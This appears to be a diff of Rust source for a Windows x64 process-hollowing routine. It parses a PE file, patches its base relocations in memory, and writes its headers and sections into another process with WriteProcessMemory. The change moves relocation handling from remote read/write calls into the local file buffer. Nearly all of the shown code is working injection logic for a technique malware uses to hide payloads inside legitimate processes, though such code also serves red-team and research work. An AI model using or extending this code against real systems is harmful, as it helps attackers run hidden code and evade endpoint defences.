@@ -51,9 +51,52 @@ impl ImageRelocationEntry {
     }
 }
 
+fn get_file_offset(
+    rva: usize,
+    nt_headers: IMAGE_NT_HEADERS64,
+    section_header: *const IMAGE_SECTION_HEADER,
+) -> usize {
+    for i in 0..nt_headers.FileHeader.NumberOfSections {
+        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
+        let end_of_header = curr_section_header.VirtualAddress + curr_section_header.SizeOfRawData;
+        if end_of_header as usize >= rva {
+            return rva - curr_section_header.VirtualAddress as usize
+                + curr_section_header.PointerToRawData as usize;
+        }
+    }
+
+    panic!("Could not find correct section!");
+}
+
+fn get_reloc_section(
+    relocation_table_address: u32,
+    nt_headers: IMAGE_NT_HEADERS64,
+    section_header: *const IMAGE_SECTION_HEADER,
+) -> IMAGE_SECTION_HEADER {
+    for i in 0..nt_headers.FileHeader.NumberOfSections {
+        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
+        if relocation_table_address == curr_section_header.VirtualAddress {
+            return curr_section_header;
+        }
+    }
+
+    panic!("Could not find reloc section!");
+}
+
+fn get_address(contents: &Vec<u8>, offset: usize) -> i64 {
+    let slice = &contents[offset..offset + 8];
+    let array: [u8; 8] = slice.try_into().expect("slice with incorrect length"); 
+    return i64::from_le_bytes(array);
+}
+
+fn write_address(contents: &mut Vec<u8>, offset: usize, address: i64) {
+    let bytes = address.to_le_bytes();
+    contents[offset..offset + 8].copy_from_slice(&bytes);
+}
+
 // This currently works only for x64. For x86 registers and offsets need to be adjusted.
 pub fn process_hollowing(filename: String) {
-    let contents = fs::read(filename.clone()).expect("Could not read file");
+    let mut contents = fs::read(filename.clone()).expect("Could not read file");
 
     let dos_header = contents.as_ptr() as *const IMAGE_DOS_HEADER;
     let nt_headers = unsafe {
@@ -104,50 +147,16 @@ pub fn process_hollowing(filename: String) {
         )
     };
 
-    let delta_image = unsafe { image_base.sub((*nt_headers).OptionalHeader.ImageBase as usize) } as i64;
-    if delta_image != 0 {
-        unsafe {(*nt_headers).OptionalHeader.ImageBase = image_base as u64};
-    }
-    
-    // Writing headers
-    unsafe {
-        WriteProcessMemory(
-            process_info.hProcess,
-            image_base as *const c_void,
-            contents.as_ptr() as *const c_void,
-            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
-            None,
-        )
-        .expect("Could not write to process memory");
-
-        let mut image_relocation_section = IMAGE_SECTION_HEADER::default();
-        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
-            let curr_section_header = *(section_header.add(i as usize));
-            let s = match std::str::from_utf8(&curr_section_header.Name) {
-                Ok(v) => v,
-                Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
-            };
-            WriteProcessMemory(
-                process_info.hProcess,
-                image_base.add(curr_section_header.VirtualAddress as usize),
-                contents
-                    .as_ptr()
-                    .add(curr_section_header.PointerToRawData as usize)
-                    as *const c_void,
-                curr_section_header.SizeOfRawData as usize,
-                None,
-            )
-            .expect("Could not write to process memory");
-
-            if s.contains(".reloc") {
-                image_relocation_section = curr_section_header;
-            }
-        }
-
-        // Check if a relocation header is present and if the image base is not the preferred image base
-        // TODO do the relocation before writing the headers, then we do not need a WriteProcess call
-        let reloc_header = (*nt_headers).OptionalHeader.DataDirectory[5];
-        if reloc_header.VirtualAddress != 0 && delta_image != 0 {
+    let delta_image =
+        unsafe { image_base.sub((*nt_headers).OptionalHeader.ImageBase as usize) } as i64;
+    let reloc_header = (unsafe { *nt_headers }).OptionalHeader.DataDirectory[5];
+    // Check if a relocation header is present and if the image base is not the preferred image base
+    if delta_image != 0 && reloc_header.VirtualAddress != 0 {
+        // If so, do the relocation
+        unsafe {
+            (*nt_headers).OptionalHeader.ImageBase = image_base as u64;
+            let image_relocation_section =
+                get_reloc_section(reloc_header.VirtualAddress, *nt_headers, section_header);
             let mut reloc_offset: usize = 0;
             while reloc_offset < reloc_header.Size as usize {
                 let image_base_relocation = contents
@@ -169,27 +178,41 @@ pub fn process_hollowing(filename: String) {
                     if (*image_relocation_entry).typ() == 0 {
                         continue;
                     }
-                    let address_location = image_base
-                        .add((*image_base_relocation).VirtualAddress as usize)
-                        .add((*image_relocation_entry).offset() as usize);
-                    let mut patched_address = 0;
-                    ReadProcessMemory(
-                        process_info.hProcess,
-                        address_location,
-                        &mut patched_address as *mut _ as *mut c_void,
-                        size_of::<u64>(),
-                        None,
-                    ).expect("Could not read ImageRelocationEntry");
+                    let relocation_address_va = (*image_base_relocation).VirtualAddress as usize
+                        + (*image_relocation_entry).offset() as usize;
+                    let relocation_address_offset = get_file_offset(relocation_address_va, *nt_headers, section_header);
+                    let mut patched_address = get_address(&contents, relocation_address_offset);
                     patched_address += delta_image;
-                    WriteProcessMemory(
-                        process_info.hProcess,
-                        address_location,
-                        &mut patched_address as *mut _ as *mut c_void,
-                        size_of::<u64>(),
-                        None,
-                    ).expect("Could not write ImageRelocationEntry");
+                    write_address(&mut contents, relocation_address_offset, patched_address);
                 }
             }
+        }
+    }
+
+    // Writing (patched) headers
+    unsafe {
+        WriteProcessMemory(
+            process_info.hProcess,
+            image_base as *const c_void,
+            contents.as_ptr() as *const c_void,
+            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
+            None,
+        )
+        .expect("Could not write to process memory");
+
+        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
+            let curr_section_header = *(section_header.add(i as usize));
+            WriteProcessMemory(
+                process_info.hProcess,
+                image_base.add(curr_section_header.VirtualAddress as usize),
+                contents
+                    .as_ptr()
+                    .add(curr_section_header.PointerToRawData as usize)
+                    as *const c_void,
+                curr_section_header.SizeOfRawData as usize,
+                None,
+            )
+            .expect("Could not write to process memory");
         }
 
         // Change image base
